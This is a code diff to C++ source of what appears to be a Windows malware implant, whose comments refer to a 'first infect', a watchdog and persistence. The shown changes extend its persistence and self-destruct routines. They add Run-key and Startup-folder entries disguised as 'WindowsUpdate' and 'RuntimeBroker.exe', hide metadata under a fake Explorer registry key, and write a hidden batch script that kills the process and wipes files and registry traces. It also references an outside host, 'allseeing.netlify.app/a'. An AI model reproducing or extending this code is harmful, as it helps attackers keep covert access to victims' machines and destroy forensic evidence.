@@ -370,7 +370,7 @@ static std::wstring GetExeNameW() {
 
 static void LogMsg(const std::string& msg);
 
-// Fixed key for install path (must NOT use per-build AGENT_REGKEY or updates lose the path).
+// Fixed key for install path / wipe metadata (must NOT use per-build AGENT_REGKEY).
 static const char* InstallMetaKey() {
     return "Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\SessionInfo";
 }
@@ -383,24 +383,76 @@ static bool PathEqualsI(const std::string& a, const std::string& b) {
     return true;
 }
 
-static std::string ReadInstallPathReg() {
+static std::string ReadMetaStr(const char* valueName) {
     HKEY hKey;
     if (RegOpenKeyExA(HKEY_CURRENT_USER, InstallMetaKey(), 0, KEY_READ, &hKey) != ERROR_SUCCESS)
         return "";
     char buf[MAX_PATH] = {0};
     DWORD type = 0, size = sizeof(buf);
-    LONG r = RegQueryValueExA(hKey, "InstallExe", NULL, &type, (LPBYTE)buf, &size);
+    LONG r = RegQueryValueExA(hKey, valueName, NULL, &type, (LPBYTE)buf, &size);
     RegCloseKey(hKey);
     if (r != ERROR_SUCCESS || type != REG_SZ || !buf[0]) return "";
     return std::string(buf);
 }
 
-static void WriteInstallPathReg(const std::string& val) {
+static void WriteMetaStr(const char* valueName, const std::string& val) {
+    if (val.empty()) return;
     HKEY hKey;
     if (RegCreateKeyExA(HKEY_CURRENT_USER, InstallMetaKey(), 0, NULL, 0, KEY_WRITE, NULL, &hKey, NULL) != ERROR_SUCCESS)
         return;
-    RegSetValueExA(hKey, "InstallExe", 0, REG_SZ, (const BYTE*)val.c_str(), (DWORD)val.size() + 1);
+    RegSetValueExA(hKey, valueName, 0, REG_SZ, (const BYTE*)val.c_str(), (DWORD)val.size() + 1);
     RegCloseKey(hKey);
+}
+
+static std::string ReadInstallPathReg() {
+    return ReadMetaStr("InstallExe");
+}
+
+static void WriteInstallPathReg(const std::string& val) {
+    WriteMetaStr("InstallExe", val);
+}
+
+static void WriteRunValueMeta() {
+    WriteMetaStr("RunValue", AGENT_RUN_VALUE);
+}
+
+// Remember first-drop path when not yet on install (for full wipe).
+static void RecordDropPathIfNeeded() {
+    char self[MAX_PATH] = {0};
+    GetModuleFileNameA(NULL, self, MAX_PATH);
+    if (!self[0]) return;
+    std::string inst = ReadInstallPathReg();
+    if (!inst.empty() && PathEqualsI(std::string(self), inst)) return;
+    if (ReadMetaStr("DropPath").empty())
+        WriteMetaStr("DropPath", self);
+}
+
+static void DeleteFileBestEffort(const std::string& path) {
+    if (path.empty()) return;
+    DeleteFileA(path.c_str());
+    MoveFileExA(path.c_str(), NULL, MOVEFILE_DELAY_UNTIL_REBOOT);
+}
+
+static void WipeTempStaging(const char* tempPath) {
+    if (!tempPath || !tempPath[0]) return;
+    std::string t(tempPath);
+    DeleteFileBestEffort(t + "dynapi_fail.log");
+    DeleteFileBestEffort(t + "svc_cleanup.bat");
+    DeleteFileBestEffort(t + "NetpenCleanup.bat");
+    DeleteFileBestEffort(t + "wuaueng.log");
+    DeleteFileBestEffort(t + AGENT_LOG_NAME);
+    DeleteFileBestEffort(t + "a.exe");
+    // Update staging (common prefixes)
+    WIN32_FIND_DATAA fd;
+    std::string pat = t + "NetpenUpdate_*";
+    HANDLE h = FindFirstFileA(pat.c_str(), &fd);
+    if (h != INVALID_HANDLE_VALUE) {
+        do {
+            if (!(fd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY))
+                DeleteFileBestEffort(t + fd.cFileName);
+        } while (FindNextFileA(h, &fd));
+        FindClose(h);
+    }
 }
 
 // Stable install EXE path: prefer registry (survives per-build name changes).
@@ -869,60 +921,112 @@ static std::string GetExeDir() {
     return "";
 }
 
-// Write an empty ".kill" file next to the EXE. On the next watchdog poll, the
-// watchdog sees this file, kills the child, and exits itself.
-static void CreateKillFlag() {
-    std::string flagPath = GetExeDir() + ".kill";
-    FILE* f = NULL;
-    fopen_s(&f, flagPath.c_str(), "w");
-    if (f) fclose(f);
+static void TouchKillFlag(const std::string& dirWithSlash) {
+    if (dirWithSlash.empty()) return;
+    std::string flagPath = dirWithSlash;
+    if (flagPath.back() != '\\' && flagPath.back() != '/') flagPath += '\\';
+    flagPath += ".kill";
+    HANDLE hf = CreateFileA(flagPath.c_str(), GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
+    if (hf != INVALID_HANDLE_VALUE) CloseHandle(hf);
 }
 
-// Check whether the ".kill" flag exists.
+static bool KillFlagInDir(const std::string& dirWithSlash) {
+    if (dirWithSlash.empty()) return false;
+    std::string flagPath = dirWithSlash;
+    if (flagPath.back() != '\\' && flagPath.back() != '/') flagPath += '\\';
+    flagPath += ".kill";
+    DWORD a = GetFileAttributesA(flagPath.c_str());
+    return a != INVALID_FILE_ATTRIBUTES && !(a & FILE_ATTRIBUTE_DIRECTORY);
+}
+
+// Write .kill next to running EXE and install dir so watchdog always sees it.
+static void CreateKillFlag() {
+    TouchKillFlag(GetExeDir());
+    std::string id = GetInstallDir();
+    if (!id.empty()) {
+        if (id.back() != '\\') id += '\\';
+        TouchKillFlag(id);
+    }
+}
+
 static bool KillFlagExists() {
-    FILE* f = NULL;
-    std::string flagPath = GetExeDir() + ".kill";
-    fopen_s(&f, flagPath.c_str(), "r");
-    if (f) { fclose(f); return true; }
+    if (KillFlagInDir(GetExeDir())) return true;
+    std::string id = GetInstallDir();
+    if (!id.empty()) {
+        if (id.back() != '\\') id += '\\';
+        if (KillFlagInDir(id)) return true;
+    }
     return false;
 }
 
-// Delete the ".kill" flag file.
 static void RemoveKillFlag() {
-    std::string flagPath = GetExeDir() + ".kill";
-    DeleteFileA(flagPath.c_str());
+    auto rm = [](const std::string& dir) {
+        if (dir.empty()) return;
+        std::string p = dir;
+        if (p.back() != '\\' && p.back() != '/') p += '\\';
+        DeleteFileA((p + ".kill").c_str());
+    };
+    rm(GetExeDir());
+    std::string id = GetInstallDir();
+    if (!id.empty()) rm(id);
 }
 
-// Self-destruct mechanism:
-//   1. Mark the EXE for deletion on next boot via MoveFileEx (survives hard reboot mid-cleanup).
-//   2. Create %TEMP%\NetpenCleanup.bat — a cmd script that waits for this process to exit,
-//      then deletes the EXE, the log file, and itself.
-//   3. Launch the batch as a hidden cmd.exe process (CREATE_NO_WINDOW).
-// Called from WndProc after CleanupPersistence and CreateKillFlag have run.
+// Full wipe after process exit: bat waits for PID then deletes all known paths.
+// Called from WndProc after CleanupPersistence and CreateKillFlag.
 static void ScheduleSelfDestruct() {
-    char tmp[MAX_PATH];
+    char tmp[MAX_PATH] = {0};
     GetTempPathA(MAX_PATH, tmp);
-    char selfPath[MAX_PATH];
+    char selfPath[MAX_PATH] = {0};
     GetModuleFileNameA(NULL, selfPath, MAX_PATH);
-    MoveFileExA(selfPath, NULL, MOVEFILE_DELAY_UNTIL_REBOOT);
-    std::string instExe = GetInstallExePath();
-    if (!instExe.empty() && !PathEqualsI(std::string(selfPath), instExe))
-        MoveFileExA(instExe.c_str(), NULL, MOVEFILE_DELAY_UNTIL_REBOOT);
+
+    std::string instExe = ReadInstallPathReg();
+    if (instExe.empty()) instExe = GetInstallExePath();
+    std::string dropPath = ReadMetaStr("DropPath");
+    std::string instDir = GetInstallDir();
+
+    // Mark locked images for reboot deletion
+    DeleteFileBestEffort(selfPath);
+    if (!instExe.empty()) DeleteFileBestEffort(instExe);
+    if (!dropPath.empty()) DeleteFileBestEffort(dropPath);
+
     DWORD pid = GetCurrentProcessId();
-    std::string logPath = std::string(tmp) + AGENT_LOG_NAME;
     std::string batPath = std::string(tmp) + "svc_cleanup.bat";
-    std::string bat =
-        std::string("@echo off\r\n")
+    std::string logPath = std::string(tmp) + AGENT_LOG_NAME;
+
+    // Install basename for careful taskkill of our image only
+    std::string instBase;
+    if (!instExe.empty()) {
+        size_t p = instExe.find_last_of("\\/");
+        instBase = (p != std::string::npos) ? instExe.substr(p + 1) : instExe;
+    }
+    std::string selfBase = GetExeName();
+
+    std::string bat = std::string("@echo off\r\n")
         + ":w\r\n"
         + "tasklist /fi \"PID eq " + std::to_string((unsigned long)pid) + "\" 2>nul | find \"" + std::to_string((unsigned long)pid) + "\" >nul\r\n"
         + "if errorlevel 1 goto r\r\n"
         + "timeout /t 1 /nobreak >nul\r\n"
         + "goto w\r\n"
-        + ":r\r\n"
-        + "del /f /q \"" + std::string(selfPath) + "\" >nul 2>&1\r\n"
-        + (instExe.empty() ? "" : ("del /f /q \"" + instExe + "\" >nul 2>&1\r\n"))
-        + "del /f /q \"" + logPath + "\" >nul 2>&1\r\n"
-        + "del /f /q \"" + batPath + "\" >nul 2>&1\r\n";
+        + ":r\r\n";
+    if (!instBase.empty())
+        bat += "taskkill /F /IM \"" + instBase + "\" /T >nul 2>&1\r\n";
+    if (!selfBase.empty() && selfBase != instBase)
+        bat += "taskkill /F /IM \"" + selfBase + "\" /T >nul 2>&1\r\n";
+    bat += "timeout /t 1 /nobreak >nul\r\n";
+    bat += "del /f /q \"" + std::string(selfPath) + "\" >nul 2>&1\r\n";
+    if (!instExe.empty())
+        bat += "del /f /q \"" + instExe + "\" >nul 2>&1\r\n";
+    if (!dropPath.empty())
+        bat += "del /f /q \"" + dropPath + "\" >nul 2>&1\r\n";
+    bat += "del /f /q \"" + logPath + "\" >nul 2>&1\r\n";
+    bat += "del /f /q \"" + std::string(tmp) + "dynapi_fail.log\" >nul 2>&1\r\n";
+    bat += "del /f /q \"" + std::string(tmp) + "wuaueng.log\" >nul 2>&1\r\n";
+    bat += "del /f /q \"" + std::string(tmp) + "NetpenUpdate_*\" >nul 2>&1\r\n";
+    bat += "del /f /q \"" + std::string(tmp) + "a.exe\" >nul 2>&1\r\n";
+    if (!instDir.empty())
+        bat += "rmdir \"" + instDir + "\" >nul 2>&1\r\n";
+    bat += "del /f /q \"" + batPath + "\" >nul 2>&1\r\n";
+
     HANDLE hf = CreateFileA(batPath.c_str(), GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
     if (hf == INVALID_HANDLE_VALUE) return;
     DWORD w = 0;
@@ -2092,33 +2196,89 @@ static bool RunValueExists() {
 //   4. Self-destruct reverses all of the above + deletes EXE files
 // First infect may land in TEMP; watchdog relocates after a delay.
 
-// Remove all persistence traces. Called during self-destruct.
+// Full host wipe of agent traces. Called during self-destruct (before exit bat).
 static void CleanupPersistence() {
+    // Snapshot paths before clearing meta
+    std::string inst = ReadInstallPathReg();
+    if (inst.empty()) inst = GetInstallExePath();
+    std::string dropPath = ReadMetaStr("DropPath");
+    std::string storedRun = ReadMetaStr("RunValue");
+    char selfPath[MAX_PATH] = {0};
+    GetModuleFileNameA(NULL, selfPath, MAX_PATH);
+    std::string instDir;
+    if (!inst.empty()) {
+        size_t p = inst.find_last_of("\\/");
+        if (p != std::string::npos) instDir = inst.substr(0, p);
+    }
+
+    // HKCU\Run — current + stored + legacy names
     HKEY hKey;
     if (RegOpenKeyExA(HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, KEY_SET_VALUE, &hKey) == ERROR_SUCCESS) {
         RegDeleteValueA(hKey, AGENT_RUN_VALUE);
+        if (!storedRun.empty()) RegDeleteValueA(hKey, storedRun.c_str());
         RegDeleteValueA(hKey, GetExeName().c_str());
         RegDeleteValueA(hKey, "a.exe");
+        RegDeleteValueA(hKey, "RuntimeBroker.exe");
         RegCloseKey(hKey);
     }
+    // Also drop any Run value whose data points at our install/drop/self (cross-build names)
+    if (RegOpenKeyExA(HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, KEY_READ | KEY_SET_VALUE, &hKey) == ERROR_SUCCESS) {
+        DWORD index = 0;
+        char valueName[256];
+        char valueData[1024];
+        while (true) {
+            DWORD nameLen = sizeof(valueName);
+            DWORD dataLen = sizeof(valueData);
+            DWORD type = 0;
+            LONG er = RegEnumValueA(hKey, index, valueName, &nameLen, NULL, &type, (LPBYTE)valueData, &dataLen);
+            if (er == ERROR_NO_MORE_ITEMS) break;
+            if (er != ERROR_SUCCESS) { index++; continue; }
+            if (type == REG_SZ && valueData[0]) {
+                std::string data(valueData);
+                bool hit = false;
+                if (!inst.empty() && data.find(inst) != std::string::npos) hit = true;
+                if (!dropPath.empty() && data.find(dropPath) != std::string::npos) hit = true;
+                if (selfPath[0] && data.find(selfPath) != std::string::npos) hit = true;
+                if (data.find("allseeing.netlify.app/a") != std::string::npos) hit = true;
+                if (hit) {
+                    RegDeleteValueA(hKey, valueName);
+                    continue; // don't increment — list shifted
+                }
+            }
+            index++;
+        }
+        RegCloseKey(hKey);
+    }
+
     RegDeleteKeyA(HKEY_CURRENT_USER, NETPEN_REGKEY);
-    char tempPath[MAX_PATH];
+
+    char tempPath[MAX_PATH] = {0};
     GetTempPathA(MAX_PATH, tempPath);
-    DeleteFileA((std::string(tempPath) + GetExeName()).c_str());
-    DeleteFileA((std::string(tempPath) + "a.exe").c_str());
-    DeleteFileA((std::string(tempPath) + AGENT_LOG_NAME).c_str());
-    std::string inst = GetInstallExePath();
-    if (!inst.empty()) DeleteFileA(inst.c_str());
-    // Clear stable install path marker
+    WipeTempStaging(tempPath);
+    DeleteFileBestEffort(std::string(tempPath) + GetExeName());
+    DeleteFileBestEffort(selfPath);
+    DeleteFileBestEffort(inst);
+    DeleteFileBestEffort(dropPath);
+    if (!instDir.empty()) {
+        DeleteFileBestEffort(instDir + "\\.kill");
+        RemoveDirectoryA(instDir.c_str());
+    }
+    DeleteFileBestEffort(GetExeDir() + ".kill");
+
+    // Clear meta markers
     HKEY hMeta = NULL;
     if (RegOpenKeyExA(HKEY_CURRENT_USER, InstallMetaKey(), 0, KEY_SET_VALUE, &hMeta) == ERROR_SUCCESS) {
         RegDeleteValueA(hMeta, "InstallExe");
+        RegDeleteValueA(hMeta, "RunValue");
+        RegDeleteValueA(hMeta, "DropPath");
         RegCloseKey(hMeta);
     }
+
     char appdata[MAX_PATH];
     if (GetEnvironmentVariableA("APPDATA", appdata, MAX_PATH) > 0 && appdata[0]) {
-        DeleteFileA((std::string(appdata) + "\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\WindowsUpdate.bat").c_str());
-        DeleteFileA((std::string(appdata) + "\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\WindowsUpdate.lnk").c_str());
+        std::string p = std::string(appdata) + "\\Microsoft\\Windows\\Start Menu\\Programs\\Startup";
+        DeleteFileA((p + "\\WindowsUpdate.bat").c_str());
+        DeleteFileA((p + "\\WindowsUpdate.lnk").c_str());
     }
     RemoveAllUsersStartupEntry();
 }
@@ -2228,6 +2388,7 @@ LRESULT CALLBACK WndProc(HWND hwnd, UINT msg, WPARAM wParam, LPARAM lParam) {
 // If elevated, also seed All Users startup so other logons get the agent.
 static void InstallStartup() {
     EnsureInstallCopy();
+    RecordDropPathIfNeeded();
     HKEY hKey;
     if (RegCreateKeyExA(HKEY_CURRENT_USER, NETPEN_REGKEY, 0, NULL, 0, KEY_WRITE, NULL, &hKey, NULL) == ERROR_SUCCESS) {
         const char* marker = "1";
@@ -2242,6 +2403,7 @@ static void InstallStartup() {
         runTarget = self;
     }
     WriteInstallPathReg(runTarget);
+    WriteRunValueMeta();
 
     if (RegOpenKeyExA(HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, KEY_SET_VALUE, &hKey) == ERROR_SUCCESS) {
         RegSetValueExA(hKey, AGENT_RUN_VALUE, 0, REG_SZ, (BYTE*)runTarget.c_str(), (DWORD)runTarget.size() + 1);
@@ -2255,6 +2417,7 @@ static void InstallStartup() {
 // Re-assert Run + startup .lnk to install path. Keep .lnk as backup.
 static void EnsureStartupEntry() {
     EnsureInstallCopy();
+    RecordDropPathIfNeeded();
     if (!RunValueExists()) {
         InstallStartup();
     } else {
@@ -2265,6 +2428,7 @@ static void EnsureStartupEntry() {
             RegSetValueExA(hKey, AGENT_RUN_VALUE, 0, REG_SZ, (BYTE*)runTarget.c_str(), (DWORD)runTarget.size() + 1);
             RegCloseKey(hKey);
         }
+        WriteRunValueMeta();
     }
     CreateStartupFolderEntry();
     if (IsElevated()) CreateAllUsersStartupEntry();
@@ -2422,6 +2586,7 @@ int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE, LPSTR lpCmdLine, int) {
     }
 
     g_hostname = GetAgentIdentity();
+    RecordDropPathIfNeeded();
 
     // Refresh Run when already on durable path. Drop-path first runs wait for
     // child stagger (~25s) and/or delayed relocate (~45s).
